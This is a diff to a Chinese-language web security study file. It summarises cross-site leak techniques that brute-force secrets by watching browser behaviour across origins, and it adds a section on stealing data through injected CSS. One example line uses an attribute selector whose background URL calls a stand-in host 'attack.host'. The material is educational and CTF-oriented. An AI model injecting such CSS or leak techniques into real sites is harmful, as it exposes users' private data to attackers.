@@ -26,4 +26,9 @@ Let's learn about Web Security.
 * [secret note keeper -- Facebook CTF 2019](https://sectt.github.io/writeups/FBCTF19/secret_note_keeper/README)  
 * [gimme-a-bit-exploring-attacks-in-the-post-xss-world](https://speakerdeck.com/lmt_swallow/gimme-a-bit-exploring-attacks-in-the-post-xss-world)  
 
-雖然和XSS一樣是跨域偷信息的技巧，但因為受限於SOP所以不是直接回傳信息，而是利用盲注: **配合爆破觀察瀏覽器的行為**(猜中和沒猜中頁面會有何差異)! 至於如何跨域觀察瀏覽器的行為呢? 特定信息是可以跨域傳送的，像是iframe count就不受SOP的限制，樓上35c3的filemanager就是利用onload數量和xss-auditor來跨域爆破出flag的!
+雖然和XSS一樣是跨域偷信息的技巧，但因為受限於SOP所以不是直接回傳信息，而是利用盲注: **配合爆破觀察瀏覽器的行為**(猜中和沒猜中頁面會有何差異)! 至於如何跨域觀察瀏覽器的行為呢? 特定信息是可以跨域傳送的，像是iframe count就不受SOP的限制，樓上35c3的filemanager就是利用onload數量和xss-auditor來跨域爆破出flag的!  
+
+## Steal data with CSS
+* [使用CSS窃取数据：攻击与防守](http://www.fwheart.club/2019/04/08/[%E8%AF%91]%E4%BD%BF%E7%94%A8CSS%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/)  
+
+在頁面中注入css，利用attribute selector，若match則傳送特定query (`{background:url("https://attack.host/aa");}`) 到自己的server以竊取資訊!
